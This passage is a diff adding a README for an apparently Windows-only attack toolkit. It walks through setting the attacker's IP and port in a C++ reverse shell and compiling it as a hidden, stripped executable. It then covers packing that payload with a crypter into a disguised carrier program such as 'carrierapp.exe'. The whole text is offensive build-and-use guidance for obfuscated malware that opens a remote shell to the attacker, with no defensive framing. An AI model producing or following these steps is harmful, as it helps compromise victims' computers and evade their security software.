@@ -1,0 +1,75 @@
+The program is Windows ONLY!
+
+All the files required are available in folder "src": Crypter.exe, Stub.exe, stub_bytes.h and reverse_optimized.cpp.
+
+In order to make your machine the attacker, you are required to input the ip address 
+in the file "reverse_optimized.cpp".
+The line required is: 
+a.sin_addr.s_addr = inet_addr("<your-ip-address>");
+
+In order to change the netcat connection port, change line:
+
+a.sin_port = htons(<your-port);
+
+Make sure your preferred port is open!
+
+To compile the code, you are required to install msys2 tools, specifically the ucrt64 tool, available here:
+
+https://www.msys2.org/
+
+After installing, if the ucrt64 windows has not opened, search for "MSYS2 UCRT64" in your searchbar.
+
+After it is opened, install the gcc package by inputting the following command into the shell:
+
+pacman -S mingw-w64-ucrt-x86_64-gcc
+
+To compile the reverse_optimized.cpp reverse shell source file, use the following line:
+
+"x86_64-w64-mingw32-g++ -O2 -s -static -mwindows -o payload.exe reverse_optimized.cpp -lws2_32"
+
+The Stub and Crypter executables are already compiled, working versions. Unless you wish to modify the logic,
+it is not required to change anything in the Stub.cpp or Crypter.cpp files.
+
+
+
+---> OPTIONAL <----
+If you do want to make some changes, after saving the files compile them with
+
+# Stub manual compilation
+"x86_64-w64-mingw32-g++ -O2 -s -static -std=c++17 stub.cpp -ladvapi32 -lshlwapi -mwindows -o Stub.exe" (no quotes needed)
+
+# Crypter manual compilation
+"x86_64-w64-mingw32-g++ -O2 -s -std=c++17 Crypter.cpp -ladvapi32 -lshlwapi -o crypter.exe" (no quotes needed)
+
+Additionally, if you change anything in the Stub file, the stub_bytes.h file also needs to be recompiled. 
+In order to do that, a python script is prepared for you, which handles all required logic.
+
+Install python in your environment through the UCRT64 shell:
+
+"pacman -S mingw-w64-ucrt-x86_64-python mingw-w64-ucrt-x86_64-python-pip" (no quotes needed)
+
+Then use the build.py automated script:
+
+"python build.py netcatpayload.exe" (no quotes)
+
+After this is done, use your Crypter to generate a new file
+
+------------------
+
+Crypter usage:
+
+"./crypter.exe" (no quotes)
+
+the output of the program will show you what flags you can use.
+
+The "-h" help flag will show you the exact same message providing information about the flags.
+
+The "-i" flag is meant for input files, or payloads.
+
+The "-o" flag is meant for output file name, or the carrier Stub.
+
+Example:
+
+"./crypter.exe -i netcatpayload.exe -o carrierapp.exe " (no quotes)
+
+The outputted stub will show in the same src folder.
